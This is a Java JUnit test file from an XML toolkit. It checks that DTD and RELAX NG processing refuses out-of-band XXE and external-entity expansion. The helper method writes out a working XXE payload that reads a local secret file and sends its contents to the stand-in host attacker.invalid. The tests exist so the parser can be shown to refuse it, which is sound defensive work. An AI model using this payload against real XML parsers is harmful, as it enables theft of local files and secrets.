package org.fxt.freexmltoolkit.service.grammar;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.io.IOException;
import java.net.URI;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

import org.fxt.freexmltoolkit.di.ServiceRegistry;
import org.fxt.freexmltoolkit.service.PropertiesService;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/**
 * Grammars must not carry the contents of local files to a server: a DTD can build the system id of a
 * parameter entity from another entity's text (out-of-band XXE), and Trang's RELAX NG reader expands
 * external entities unless it is given a secure parser.
 */
@DisplayName("DTD and RELAX NG: no data leaks")
class GrammarSecurityTest {

    @TempDir
    Path dir;

    @BeforeAll
    static void services() {
        ServiceRegistry.initialize();
    }

    @BeforeEach
    void cache() {
        System.setProperty("fxt.grammarXsd.dir", dir.resolve("cache").toString());
    }

    @AfterEach
    void clear() {
        System.clearProperty("fxt.grammarXsd.dir");
    }

    private String leakingSubset() throws IOException {
        Path secret = Files.writeString(dir.resolve("secret.txt"), "TOKEN123");
        return "<!ENTITY % f SYSTEM \"" + secret.toUri() + "\">"
                + "<!ENTITY % e \"<!ENTITY &#x25; x SYSTEM 'https://attacker.invalid/?d=%f;'>\">"
                + "%e; %x;";
    }

    @Test
    @DisplayName("DTD validation refuses to download after reading a local file")
    void dtdValidationDoesNotLeak() throws IOException {
        // In an external DTD (the attacker's, here a local one) parameter entities may occur in markup
        Files.writeString(dir.resolve("evil.dtd"), leakingSubset() + "<!ELEMENT r EMPTY>");
        String xml = "<!DOCTYPE r SYSTEM \"evil.dtd\"><r/>";
        List<GrammarProblem> problems = DtdValidator.validate(xml, dir.resolve("doc.xml").toUri().toString(), null);
        assertTrue(problems.stream().anyMatch(p -> p.message().contains("Refused")), problems.toString());
    }

    @Test
    @DisplayName("Translating an internal subset refuses the same chain")
    void internalSubsetTranslationDoesNotLeak() throws IOException {
        String xml = "<!DOCTYPE r [" + leakingSubset() + "<!ELEMENT r EMPTY>]><r/>";
        IOException e = assertThrows(IOException.class, () -> GrammarToXsd.convertInternalSubset(xml));
        assertTrue(String.valueOf(e.getMessage()).contains("Refused"), e.getMessage());
    }

    @Test
    @DisplayName("A RELAX NG schema with a DOCTYPE is not translated; entities are not expanded")
    void relaxNgWithDoctype() throws IOException {
        Files.writeString(dir.resolve("secret.txt"), "TOKEN123");
        Path rng = Files.writeString(dir.resolve("s.rng"), """
                <!DOCTYPE grammar [<!ENTITY s SYSTEM "secret.txt">]>
                <grammar xmlns="http://relaxng.org/ns/structure/1.0">
                  <start><element name="r"><choice><value>&s;</value><value>x</value></choice></element></start>
                </grammar>
                """);
        assertThrows(IOException.class, () -> GrammarToXsd.convert(rng));
        List<GrammarProblem> problems = RelaxNgValidator.validate("<r>TOKEN123</r>", null, rng.toFile());
        assertFalse(problems.isEmpty(), "the entity is not expanded, so TOKEN123 is no allowed value");
    }

    @Test
    @DisplayName("A session mixes neither local files after downloads nor the other way round")
    void sessionRule() throws IOException {
        var session = new GrammarResolver.Session("file:/a/root.dtd");
        assertTrue(session.isRoot(URI.create("file:/a/./root.dtd")));
        session.check(URI.create("file:/a/module.ent"), false);
        session.check(URI.create("file:/a/other.ent"), false);
        assertThrows(IOException.class, () -> session.check(URI.create("https://x.invalid/m.ent"), true));

        var remote = new GrammarResolver.Session(null);
        remote.check(URI.create("https://x.invalid/a.ent"), true);
        assertThrows(IOException.class, () -> remote.check(URI.create("file:/home/u/secret"), false));
    }

    @Test
    @DisplayName("Network shares (file://host/…) are refused")
    void networkShares() {
        IOException e = assertThrows(IOException.class,
                () -> GrammarResolver.resolveToFile("-//X//Y", "file://evil.invalid/share/x.dtd", null));
        assertTrue(e.getMessage().contains("network share"), e.getMessage());
    }

    @Test
    @DisplayName("A DTD with local modules still validates")
    void localModulesStillWork() throws IOException {
        Files.writeString(dir.resolve("chars.ent"), "<!ENTITY copy \"(c)\">");
        Files.writeString(dir.resolve("doc.dtd"), "<!ENTITY % chars SYSTEM \"chars.ent\">%chars;<!ELEMENT r (#PCDATA)>");
        Path xml = dir.resolve("doc.xml");
        List<GrammarProblem> problems = DtdValidator.validate("<!DOCTYPE r SYSTEM \"doc.dtd\"><r>&copy;</r>",
                xml.toUri().toString(), null);
        assertEquals(List.of(), problems);
        assertDoesNotThrow(() -> GrammarToXsd.convert(dir.resolve("doc.dtd")));
    }

    @Test
    @DisplayName("Switching DTDs off also stops their translation (project bindings)")
    void policyStopsTranslation() throws IOException {
        Path dtd = Files.writeString(dir.resolve("p.dtd"), "<!ELEMENT r EMPTY>");
        PropertiesService props = ServiceRegistry.get(PropertiesService.class);
        try {
            props.set(GrammarPolicy.DTD_ALLOWED, "false");
            assertThrows(IOException.class, () -> GrammarToXsd.convert(dtd));
        } finally {
            props.set(GrammarPolicy.DTD_ALLOWED, "true");
        }
    }
}
